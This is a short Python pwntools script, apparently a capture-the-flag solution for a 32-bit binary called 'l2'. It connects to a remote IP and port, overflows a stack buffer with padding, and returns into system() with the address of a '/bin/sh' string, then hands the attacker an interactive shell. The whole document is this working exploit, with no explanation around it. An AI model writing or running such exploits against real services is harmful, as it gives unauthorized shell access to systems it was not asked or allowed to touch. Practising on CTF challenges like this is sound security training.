from pwn import *
#p=process('./l2')
p=remote('111.198.29.45',46093)
binsh=0x0804a024
e=ELF('./l2')
sys_plt=e.plt['system']
payload='a'*(0x4+0x88)+p32(sys_plt)+'aaaa'+p32(binsh)
p.sendline(payload)
p.interactive()
